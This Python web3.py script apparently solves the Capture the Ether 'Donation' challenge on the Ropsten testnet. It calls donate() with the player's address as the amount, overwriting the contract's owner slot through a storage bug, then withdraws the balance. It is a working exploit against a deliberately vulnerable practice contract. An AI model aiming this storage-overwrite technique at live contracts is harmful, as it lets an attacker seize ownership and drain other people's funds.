from web3 import Web3
from config import CONFIG
from solcx import compile_source

w3 = Web3(Web3.HTTPProvider(CONFIG["INFURA_URL_ROPSTEN"]))

CHALLENGE_CONTRACT_ADDRESS = "0x92F3E5B9b4A96B9cBaF43344CE85aB81406d8f6e"

with open('CTE_Contracts/DonationChallenge.sol', 'r') as file:
    challenge_code = file.read()

compiled_challenge_code = compile_source(challenge_code, solc_version="0.4.21")
challenge_contract_id, challenge_contract_interface = compiled_challenge_code.popitem()
challenge_contract_abi = challenge_contract_interface["abi"]
challenge_contract = w3.eth.contract(address=CHALLENGE_CONTRACT_ADDRESS, abi=challenge_contract_abi)

exploit_donation_amount = int(CONFIG["ADDRESS_1"], base=16)
value_to_send = exploit_donation_amount//(10**36)

print(f"amount of ether send: {value_to_send/(10**18)}")

tx = challenge_contract.functions.donate(exploit_donation_amount).buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "value": value_to_send,
    "gas": 3000000,
    "gasPrice": w3.toWei("5", "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

tx = challenge_contract.functions.withdraw().buildTransaction({
    "nonce": w3.eth.getTransactionCount(CONFIG["ADDRESS_1"]),
    "gas": 3000000,
    "gasPrice": w3.toWei("5", "gwei")
})
signed_tx = w3.eth.account.signTransaction(tx, private_key=CONFIG["PRIVATE_KEY_1"])
tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
receipt = w3.eth.waitForTransactionReceipt(tx_hash)

assert challenge_contract.functions.isComplete().call()